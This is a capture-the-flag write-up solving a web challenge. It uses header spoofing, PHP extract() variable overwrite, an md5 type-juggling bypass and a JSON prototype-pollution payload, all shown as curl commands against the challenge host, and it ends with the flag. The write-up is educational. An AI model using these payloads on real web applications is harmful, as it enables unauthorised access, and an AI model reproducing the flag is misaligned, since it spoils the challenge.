# steps to success
## Solution
we are given `.htaccess` file in the source, looking at it, we get to know that the request must contain referer as localhost and user-agent as B3gul4.

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !.*localhost [NC]
RewriteRule ^ https://www.youtube.com/watch?v=zqLEO5tIuYs [R=301,L]

RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !=B3gul4 [NC]
RewriteRule ^ https://www.youtube.com/watch?v=zqLEO5tIuYs [R=301,L]
```

```
curl -H "referer: localhost" -H "user-agent: B3gul4" https://steps-to-success.ctf.pearlctf.in
ROBOTS ARE COOL
```

heading to `robots.txt` we find

```
User-agent: *

Disallow: /gr34t_/page.php
```

we get the followinf code at `/gr34t_/page.php` endpoint

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
    <title>AWESOME_PHP</title>
</head>
<body>
    <div>
        <pre><code><span>&lt</span>?php
    $password = "REDACTED";
    extract($_GET); // get request to "input" arg
    if ($input == $password) {
        if ($input != "PearlCTF_15345384" && md5($input) == md5("PearlCTF_15345384")) {
            echo "SECRET";
        } else {
            echo "md5 didn't match";
        }
    } else {
        echo "Wrong password!";
    }
?></code></pre>
    </div>
    <div style="background-color: #baffc0;">
        Wrong password!
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
</body>
</html>
```

We can see that our input is validated against a password, later the md5 of our input is validated against the md5 of `PearlCTF_15345384`, we can bypass the password check since `extract` is used to create a variable with our input as value, we can overwrite the password variable if we also pass password in get parameters. The md5 bypass is [php typejuggling](https://news.ycombinator.com/item?id=9484757).

```
curl -H "referer: localhost" -H "user-agent: B3gul4" https://steps-to-success.ctf.pearlctf.in/gr34t_/page.php\?password\=QNKCDZO\&input\=QNKCDZO
```

this will tell us to head to `/u_c4nt_gu355_th1s`, we find that GET method is not allowed at this endpoint, on making a POST request we get JSON decode error, after seeing the source, we find that there are two snippets that were obfuscated, we just need to run the `main.js` with node and print the snippets.

```js
(o,e)=>{let f=Object.keys(e);for(key of f)void 0!=o[key]&&isObject(o[key])&&isObject(e[key])?func1(o[key],e[key]):o[key]=e[key]};
```
```js
const userObj=JSON.parse(req.body.obj);let template={user:1,role:"staff",access:{server:"none",database:"partial"},organisation:"pearl.in"};Object.setPrototypeOf(template,{}),userObj.isAdmin?result="You cannot do that here!":(func1(template,userObj),template.isAdmin&&(result=FLAG));
```

we see that our request must be of form `obj=<json>` at the endpoint and this `obj` is recursively merged with a predefined template. Later the merged object is checked for `isAdmin` key.

If we send `{"isAdmin": true}` as our `obj`, we can see that there is a check that doesn't allow this, so we need to have field `isAdmin` without it being there.

We can clearly see that this is to be done by prototype pollution.

so we send `{"__proto__": {"isAdmin": true}}`, the final payload is

```
curl -X POST https://steps-to-success.ctf.pearlctf.in/u_c4nt_gu355_th1s -d 'obj={"__proto__": {"isAdmin": true}}'
```

## Flag
`pearl{7hr0ugh_7H3_SeA_Thr0ugh_the_Space_V0yag3_com35_to_EnD!}`
